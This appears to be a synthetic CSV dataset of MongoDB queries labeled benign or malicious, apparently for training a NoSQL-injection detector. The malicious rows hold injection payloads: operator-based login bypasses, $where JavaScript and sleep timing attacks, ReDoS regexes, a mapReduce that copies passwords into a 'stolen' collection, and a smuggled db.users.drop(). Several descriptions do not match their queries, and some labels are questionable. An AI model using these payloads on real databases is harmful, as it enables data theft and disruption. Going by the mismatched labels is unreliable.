id,label,type,collection,query,full_command,description,timestamp
8285,malicious,operator_injection,orders,"{""user_id"": {""$lt"": """"}}","db.orders.find({""user_id"": {""$lt"": """"}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.357343
8286,malicious,regex_injection,products,"{""email"": {""$regex"": "".*""}}","db.products.find({""email"": {""$regex"": "".*""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.317192
8287,benign,find_with_projection,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.541067
8288,benign,simple_find,orders,"{""name"": ""Nicholas Mason""}","db.orders.find({""name"": ""Nicholas Mason""})",Simple field match query,2025-11-24T21:15:54.503355
8289,malicious,operator_injection,accounts,"{""user_id"": {""$exists"": true, ""$ne"": null}}","db.accounts.find({""user_id"": {""$exists"": true, ""$ne"": null}})",Using $gt operator to bypass authentication or leak data,2025-11-24T21:15:54.300042
8290,benign,find_with_projection,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}, {""password"": 0})",Query with field projection,2025-11-24T21:15:54.366990
8291,malicious,array_injection,orders,"{""name.0"": {""$exists"": true}}","db.orders.find({""name.0"": {""$exists"": true}})",Injection through array operators,2025-11-24T21:15:54.357008
8292,malicious,operator_injection,transactions,"{""admin"": {""$eq"": true}}","db.transactions.find({""admin"": {""$eq"": true}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.347289
8293,benign,find_with_projection,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.495061
8294,malicious,or_injection,transactions,"{""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]}","db.transactions.find({""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.338997
8295,malicious,where_injection,users,"{""$where"": ""this.password.length > 0""}","db.users.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.357447
8296,benign,aggregation_query,orders,"[{""$match"": {""created_at"": {""$gte"": ""2025-11-12""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}]","db.orders.aggregate([{""$match"": {""created_at"": {""$gte"": ""2025-11-12""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.486566
8297,malicious,operator_injection,logs,"{""username"": ""kennedyjames"", ""password"": {""$ne"": """"}}","db.logs.find({""username"": ""kennedyjames"", ""password"": {""$ne"": """"}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.341269
8298,malicious,operator_injection,customers,"{""status"": {""$regex"": "".*""}}","db.customers.find({""status"": {""$regex"": "".*""}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.333234
8299,malicious,or_injection,products,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.products.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.288720
8300,benign,find_with_limit,comments,"{""status"": ""active""}","db.comments.find({""status"": ""active""}).skip(452).limit(24)",Query with pagination,2025-11-24T21:15:54.389148
8301,malicious,where_injection,sessions,"{""$where"": ""this.password.match(/^a/)""}","db.sessions.find({""$where"": ""this.password.match(/^a/)""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.307366
8302,malicious,where_injection,products,"{""$where"": ""function() { sleep(5000); return true; }""}","db.products.find({""$where"": ""function() { sleep(5000); return true; }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.316991
8303,benign,simple_find,sessions,"{""username"": ""ebradley""}","db.sessions.find({""username"": ""ebradley""})",Simple field match query,2025-11-24T21:15:54.497219
8304,benign,find_with_limit,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}).skip(334).limit(83)",Query with pagination,2025-11-24T21:15:54.510188
8305,benign,find_with_limit,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}).skip(378).limit(90)",Query with pagination,2025-11-24T21:15:54.448438
8306,malicious,operator_injection,products,"{""role"": {""$lt"": """"}}","db.products.find({""role"": {""$lt"": """"}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.326365
8307,malicious,aggregation_injection,orders,"[{""$project"": {""password"": 1, ""email"": 1}}]","db.orders.aggregate([{""$project"": {""password"": 1, ""email"": 1}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.324550
8308,benign,find_with_sort,products,{},"db.products.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.481827
8309,malicious,mapreduce_injection,products,"{""mapreduce"": ""products"", ""map"": ""function() { emit(this._id, this.password); }"", ""reduce"": ""function(key, values) { db.stolen.insert({data: values}); return 1; }"", ""out"": ""attack_results""}","db.runCommand({""mapreduce"": ""products"", ""map"": ""function() { emit(this._id, this.password); }"", ""reduce"": ""function(key, values) { db.stolen.insert({data: values}); return 1; }"", ""out"": ""attack_results""})",Executing malicious JavaScript through MapReduce,2025-11-24T21:15:54.337242
8310,malicious,operator_injection,accounts,"{""admin"": {""$eq"": true}}","db.accounts.find({""admin"": {""$eq"": true}})",Using $nin operator to bypass authentication or leak data,2025-11-24T21:15:54.343535
8311,benign,count_query,logs,{},db.logs.countDocuments({}),Document count query,2025-11-24T21:15:54.434426
8312,malicious,json_injection,logs,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.logs.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.354504
8313,benign,find_with_limit,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}).skip(458).limit(17)",Query with pagination,2025-11-24T21:15:54.456648
8314,benign,distinct_query,sessions,"{""field"": ""brand""}","db.sessions.distinct(""brand"")",Field distinct query,2025-11-24T21:15:54.457660
8315,benign,count_query,users,"{""created_at"": {""$gte"": ""2025-11-10""}}","db.users.countDocuments({""created_at"": {""$gte"": ""2025-11-10""}})",Document count query,2025-11-24T21:15:54.502725
8316,benign,find_with_limit,comments,"{""status"": ""active""}","db.comments.find({""status"": ""active""}).skip(492).limit(75)",Query with pagination,2025-11-24T21:15:54.556728
8317,benign,find_with_limit,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}).skip(462).limit(33)",Query with pagination,2025-11-24T21:15:54.522527
8318,malicious,regex_injection,customers,"{""status"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}}","db.customers.find({""status"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.346649
8319,benign,aggregation_query,orders,"[{""$match"": {""price"": {""$gte"": 100}}}, {""$sort"": {""price"": -1}}, {""$limit"": 10}]","db.orders.aggregate([{""$match"": {""price"": {""$gte"": 100}}}, {""$sort"": {""price"": -1}}, {""$limit"": 10}])",Aggregation pipeline query,2025-11-24T21:15:54.379261
8320,benign,find_with_sort,sessions,{},"db.sessions.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.419208
8321,benign,find_with_sort,products,{},"db.products.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.553923
8322,benign,count_query,orders,"{""status"": ""active""}","db.orders.countDocuments({""status"": ""active""})",Document count query,2025-11-24T21:15:54.416325
8323,benign,distinct_query,logs,"{""field"": ""brand""}","db.logs.distinct(""brand"")",Field distinct query,2025-11-24T21:15:54.502750
8324,benign,simple_find,users,"{""status"": ""pending""}","db.users.find({""status"": ""pending""})",Simple field match query,2025-11-24T21:15:54.411447
8325,benign,distinct_query,users,"{""field"": ""status""}","db.users.distinct(""status"")",Field distinct query,2025-11-24T21:15:54.446012
8326,benign,find_with_projection,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.459034
8327,benign,simple_find,articles,"{""category"": ""books""}","db.articles.find({""category"": ""books""})",Simple field match query,2025-11-24T21:15:54.505067
8328,malicious,regex_injection,accounts,"{""status"": {""$regex"": ""([a-zA-Z]+)*$""}}","db.accounts.find({""status"": {""$regex"": ""([a-zA-Z]+)*$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.308564
8329,benign,distinct_query,customers,"{""field"": ""status""}","db.customers.distinct(""status"")",Field distinct query,2025-11-24T21:15:54.451960
8330,benign,find_with_sort,logs,{},"db.logs.find({}).sort({""created_at"": -1})",Query with sorting,2025-11-24T21:15:54.495228
8331,malicious,operator_injection,accounts,"{""admin"": {""$eq"": true}}","db.accounts.find({""admin"": {""$eq"": true}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.349296
8332,malicious,where_injection,products,"{""$where"": ""(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()""}","db.products.find({""$where"": ""(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.350891
8333,benign,find_with_projection,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.490988
8334,benign,count_query,articles,"{""status"": ""active""}","db.articles.countDocuments({""status"": ""active""})",Document count query,2025-11-24T21:15:54.487368
8335,benign,find_with_limit,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}).skip(321).limit(95)",Query with pagination,2025-11-24T21:15:54.441701
8336,malicious,where_injection,sessions,"{""$where"": ""function() { return this.role == 'admin' }""}","db.sessions.find({""$where"": ""function() { return this.role == 'admin' }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.288911
8337,malicious,comment_injection,accounts,"{""$comment"": ""/*"", ""username"": ""*/admin""}","db.accounts.find({""$comment"": ""/*"", ""username"": ""*/admin""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.315730
8338,benign,find_with_sort,products,{},"db.products.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.509651
8339,benign,aggregation_query,orders,"[{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}]","db.orders.aggregate([{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.371579
8340,malicious,operator_injection,accounts,"{""admin"": {""$exists"": true, ""$ne"": null}}","db.accounts.find({""admin"": {""$exists"": true, ""$ne"": null}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.291846
8341,malicious,array_injection,accounts,"{""email.0"": {""$exists"": true}}","db.accounts.find({""email.0"": {""$exists"": true}})",Injection through array operators,2025-11-24T21:15:54.316337
8342,benign,simple_find,orders,"{""status"": ""inactive""}","db.orders.find({""status"": ""inactive""})",Simple field match query,2025-11-24T21:15:54.384356
8343,benign,aggregation_query,orders,"[{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}]","db.orders.aggregate([{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}])",Aggregation pipeline query,2025-11-24T21:15:54.556988
8344,benign,simple_find,articles,"{""category"": ""clothing""}","db.articles.find({""category"": ""clothing""})",Simple field match query,2025-11-24T21:15:54.393406
8345,benign,update_query,articles,"{""filter"": {""_id"": ""ec4b8bb4-1a2f-4c4d-832c-4995d3790bc3""}, ""update"": {""$set"": {""status"": ""active""}}}","db.articles.updateOne({""_id"": ""ec4b8bb4-1a2f-4c4d-832c-4995d3790bc3""}, {""$set"": {""status"": ""active""}})",Document update operation,2025-11-24T21:15:54.516346
8346,benign,simple_find,orders,"{""category"": ""electronics""}","db.orders.find({""category"": ""electronics""})",Simple field match query,2025-11-24T21:15:54.430166
8347,benign,find_with_sort,sessions,{},"db.sessions.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.368777
8348,benign,find_with_limit,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}).skip(394).limit(69)",Query with pagination,2025-11-24T21:15:54.482168
8349,benign,find_with_limit,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}).skip(460).limit(71)",Query with pagination,2025-11-24T21:15:54.560740
8350,malicious,or_injection,transactions,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.transactions.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.299897
8351,benign,simple_find,orders,"{""status"": ""inactive""}","db.orders.find({""status"": ""inactive""})",Simple field match query,2025-11-24T21:15:54.395353
8352,malicious,operator_injection,products,"{""email"": {""$exists"": true, ""$ne"": null}}","db.products.find({""email"": {""$exists"": true, ""$ne"": null}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.318859
8353,malicious,regex_injection,accounts,"{""user_id"": {""$regex"": "".{1,1000000}""}}","db.accounts.find({""user_id"": {""$regex"": "".{1,1000000}""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.291161
8354,malicious,comment_injection,users,"{""username"": ""admin'--"", ""password"": ""anything""}","db.users.find({""username"": ""admin'--"", ""password"": ""anything""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.313375
8355,benign,insert_query,products,"{""name"": ""Stand-alone responsive ability"", ""price"": 506.42, ""category"": ""electronics"", ""stock"": 950, ""rating"": 2.1, ""brand"": ""\u65b0\u5b87\u9f99\u4fe1\u606f\u7f51\u7edc\u6709\u9650\u516c\u53f8""}","db.products.insertOne({""name"": ""Stand-alone responsive ability"", ""price"": 506.42, ""category"": ""electronics"", ""stock"": 950, ""rating"": 2.1, ""brand"": ""\u65b0\u5b87\u9f99\u4fe1\u606f\u7f51\u7edc\u6709\u9650\u516c\u53f8""})",Document insert operation,2025-11-24T21:15:54.522788
8356,malicious,where_injection,sessions,"{""$where"": ""this.password.length > 0""}","db.sessions.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.325077
8357,benign,find_with_sort,logs,{},"db.logs.find({}).sort({""created_at"": -1})",Query with sorting,2025-11-24T21:15:54.464062
8358,malicious,where_injection,logs,"{""$where"": ""this.username == 'admin'""}","db.logs.find({""$where"": ""this.username == 'admin'""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.296620
8359,benign,find_with_projection,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.372431
8360,benign,count_query,products,"{""status"": ""active""}","db.products.countDocuments({""status"": ""active""})",Document count query,2025-11-24T21:15:54.399790
8361,malicious,comment_injection,users,"{""$comment"": ""/*"", ""username"": ""*/admin""}","db.users.find({""$comment"": ""/*"", ""username"": ""*/admin""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.354615
8362,benign,distinct_query,logs,"{""field"": ""role""}","db.logs.distinct(""role"")",Field distinct query,2025-11-24T21:15:54.436351
8363,benign,aggregation_query,articles,"[{""$match"": {""created_at"": {""$gte"": ""2025-11-13""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}]","db.articles.aggregate([{""$match"": {""created_at"": {""$gte"": ""2025-11-13""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.557259
8364,benign,update_query,sessions,"{""filter"": {""_id"": ""ce0fe7af-b3a5-42cb-8272-adf3238e7ae4""}, ""update"": {""$push"": {""tags"": ""save""}}}","db.sessions.updateOne({""_id"": ""ce0fe7af-b3a5-42cb-8272-adf3238e7ae4""}, {""$push"": {""tags"": ""save""}})",Document update operation,2025-11-24T21:15:54.495109
8365,benign,find_with_projection,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.364113
8366,benign,find_with_sort,sessions,{},"db.sessions.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.435619
8367,benign,simple_find,sessions,"{""status"": ""inactive""}","db.sessions.find({""status"": ""inactive""})",Simple field match query,2025-11-24T21:15:54.512618
8368,benign,simple_find,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""})",Simple field match query,2025-11-24T21:15:54.550804
8369,malicious,comment_injection,orders,"{""username"": ""admin'--"", ""password"": ""anything""}","db.orders.find({""username"": ""admin'--"", ""password"": ""anything""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.359419
8370,benign,find_with_sort,articles,{},"db.articles.find({}).sort({""created_at"": -1})",Query with sorting,2025-11-24T21:15:54.435274
8371,benign,count_query,sessions,"{""category"": ""electronics""}","db.sessions.countDocuments({""category"": ""electronics""})",Document count query,2025-11-24T21:15:54.393440
8372,malicious,json_injection,transactions,"{""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]}","db.transactions.find({""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.336184
8373,benign,find_with_limit,comments,"{""status"": ""active""}","db.comments.find({""status"": ""active""}).skip(428).limit(44)",Query with pagination,2025-11-24T21:15:54.409214
8374,malicious,where_injection,orders,"{""$where"": ""sleep(5000)""}","db.orders.find({""$where"": ""sleep(5000)""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.314101
8375,benign,simple_find,logs,"{""status"": ""pending""}","db.logs.find({""status"": ""pending""})",Simple field match query,2025-11-24T21:15:54.494698
8376,benign,find_with_sort,customers,{},"db.customers.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.453901
8377,benign,simple_find,customers,"{""order_id"": ""69c6ae47-8d30-4e8b-9ea3-182c6709672f""}","db.customers.find({""order_id"": ""69c6ae47-8d30-4e8b-9ea3-182c6709672f""})",Simple field match query,2025-11-24T21:15:54.560011
8378,benign,simple_find,comments,"{""email"": ""songxia@example.net""}","db.comments.find({""email"": ""songxia@example.net""})",Simple field match query,2025-11-24T21:15:54.556276
8379,malicious,json_injection,transactions,"{""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]}","db.transactions.find({""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.344980
8380,malicious,comment_injection,customers,"{""$comment"": ""'); db.users.drop(); //"", ""username"": ""admin""}","db.customers.find({""$comment"": ""'); db.users.drop(); //"", ""username"": ""admin""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.342221
8381,malicious,operator_injection,sessions,"{""_id"": {""$ne"": null}}","db.sessions.find({""_id"": {""$ne"": null}})",Using $ne operator to bypass authentication or leak data,2025-11-24T21:15:54.332047
8382,malicious,aggregation_injection,accounts,"[{""$match"": {}}, {""$merge"": {""into"": ""attacker_collection""}}]","db.accounts.aggregate([{""$match"": {}}, {""$merge"": {""into"": ""attacker_collection""}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.324545
8383,malicious,json_injection,orders,"{""username.__proto__.admin"": true}","db.orders.find({""username.__proto__.admin"": true})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.325243
8384,benign,find_with_limit,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}).skip(122).limit(56)",Query with pagination,2025-11-24T21:15:54.555817
8385,malicious,operator_injection,logs,"{""token"": {""$exists"": true, ""$ne"": null}}","db.logs.find({""token"": {""$exists"": true, ""$ne"": null}})",Using $exists operator to bypass authentication or leak data,2025-11-24T21:15:54.336431
8386,benign,find_with_projection,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.452912
8387,benign,find_with_limit,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}).skip(126).limit(43)",Query with pagination,2025-11-24T21:15:54.540889
8388,benign,find_with_sort,customers,{},"db.customers.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.490260
8389,benign,find_with_sort,comments,{},"db.comments.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.374482
8390,benign,delete_query,users,"{""created_at"": {""$lt"": ""2025-11-13""}}","db.users.deleteOne({""created_at"": {""$lt"": ""2025-11-13""}})",Document delete operation,2025-11-24T21:15:54.518659
8391,benign,simple_find,articles,"{""role"": ""user""}","db.articles.find({""role"": ""user""})",Simple field match query,2025-11-24T21:15:54.400989
8392,benign,find_with_limit,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}).skip(468).limit(85)",Query with pagination,2025-11-24T21:15:54.405073
8393,malicious,aggregation_injection,accounts,"[{""$project"": {""password"": 1, ""email"": 1}}]","db.accounts.aggregate([{""$project"": {""password"": 1, ""email"": 1}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.341650
8394,malicious,where_injection,users,"{""$where"": ""db.users.find().forEach(function(u){print(u.password)})""}","db.users.find({""$where"": ""db.users.find().forEach(function(u){print(u.password)})""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.326166
8395,malicious,operator_injection,accounts,"{""id"": {""$gte"": """"}}","db.accounts.find({""id"": {""$gte"": """"}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.326414
8396,benign,distinct_query,products,"{""field"": ""category""}","db.products.distinct(""category"")",Field distinct query,2025-11-24T21:15:54.382652
8397,benign,update_query,comments,"{""filter"": {""_id"": ""7325be9f-f06a-46ea-b3dd-0af04888171c""}, ""update"": {""$set"": {""updated_at"": ""2025-11-24T21:15:54.544317""}}}","db.comments.updateOne({""_id"": ""7325be9f-f06a-46ea-b3dd-0af04888171c""}, {""$set"": {""updated_at"": ""2025-11-24T21:15:54.544317""}})",Document update operation,2025-11-24T21:15:54.544385
8398,benign,delete_query,products,"{""created_at"": {""$lt"": ""2025-02-18""}}","db.products.deleteOne({""created_at"": {""$lt"": ""2025-02-18""}})",Document delete operation,2025-11-24T21:15:54.452171
8399,benign,aggregation_query,comments,"[{""$match"": {""created_at"": {""$gte"": ""2025-11-01""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}]","db.comments.aggregate([{""$match"": {""created_at"": {""$gte"": ""2025-11-01""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.476946
8400,malicious,aggregation_injection,products,"[{""$match"": {}}, {""$merge"": {""into"": ""attacker_collection""}}]","db.products.aggregate([{""$match"": {}}, {""$merge"": {""into"": ""attacker_collection""}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.309798
8401,benign,simple_find,orders,"{""username"": ""mengjing""}","db.orders.find({""username"": ""mengjing""})",Simple field match query,2025-11-24T21:15:54.437644
8402,benign,find_with_sort,logs,{},"db.logs.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.395126
8403,malicious,json_injection,logs,"{""$comment"": ""malicious"", ""username"": ""admin""}","db.logs.find({""$comment"": ""malicious"", ""username"": ""admin""})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.303453
8404,benign,simple_find,comments,"{""username"": ""angela88""}","db.comments.find({""username"": ""angela88""})",Simple field match query,2025-11-24T21:15:54.409203
8405,malicious,regex_injection,sessions,"{""role"": {""$regex"": ""(a+)+$""}}","db.sessions.find({""role"": {""$regex"": ""(a+)+$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.330711
8406,malicious,or_injection,transactions,"{""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]}","db.transactions.find({""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.352368
8407,malicious,operator_injection,orders,"{""role"": {""$exists"": true, ""$ne"": null}}","db.orders.find({""role"": {""$exists"": true, ""$ne"": null}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.304377
8408,malicious,json_injection,orders,"{""$comment"": ""malicious"", ""username"": ""admin""}","db.orders.find({""$comment"": ""malicious"", ""username"": ""admin""})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.321702
8409,malicious,where_injection,logs,"{""$where"": ""this.password.match(/^a/)""}","db.logs.find({""$where"": ""this.password.match(/^a/)""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.309345
8410,benign,simple_find,logs,"{""price"": 61.69}","db.logs.find({""price"": 61.69})",Simple field match query,2025-11-24T21:15:54.483649
8411,benign,find_with_sort,users,{},"db.users.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.495392
8412,benign,simple_find,logs,"{""username"": ""maojing""}","db.logs.find({""username"": ""maojing""})",Simple field match query,2025-11-24T21:15:54.399739
8413,malicious,json_injection,transactions,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.transactions.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.307662
8414,malicious,operator_injection,accounts,"{""id"": {""$regex"": "".*""}}","db.accounts.find({""id"": {""$regex"": "".*""}})",Using $lte operator to bypass authentication or leak data,2025-11-24T21:15:54.356779
8415,benign,simple_find,comments,"{""category"": ""books""}","db.comments.find({""category"": ""books""})",Simple field match query,2025-11-24T21:15:54.515851
8416,benign,find_with_limit,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}).skip(245).limit(42)",Query with pagination,2025-11-24T21:15:54.527229
8417,malicious,or_injection,accounts,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.accounts.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.303595
8418,benign,aggregation_query,users,"[{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}]","db.users.aggregate([{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.555835
8419,malicious,array_injection,customers,"{""password"": {""$size"": {""$gt"": 0}}}","db.customers.find({""password"": {""$size"": {""$gt"": 0}}})",Injection through array operators,2025-11-24T21:15:54.293373
8420,benign,find_with_projection,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.441900
8421,malicious,or_injection,transactions,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.transactions.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.351222
8422,benign,find_with_projection,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.475298
8423,benign,update_query,articles,"{""filter"": {""_id"": ""f799def4-db4f-4aea-b02a-eb0c6407efee""}, ""update"": {""$set"": {""updated_at"": ""2025-11-24T21:15:54.537150""}}}","db.articles.updateOne({""_id"": ""f799def4-db4f-4aea-b02a-eb0c6407efee""}, {""$set"": {""updated_at"": ""2025-11-24T21:15:54.537150""}})",Document update operation,2025-11-24T21:15:54.537185
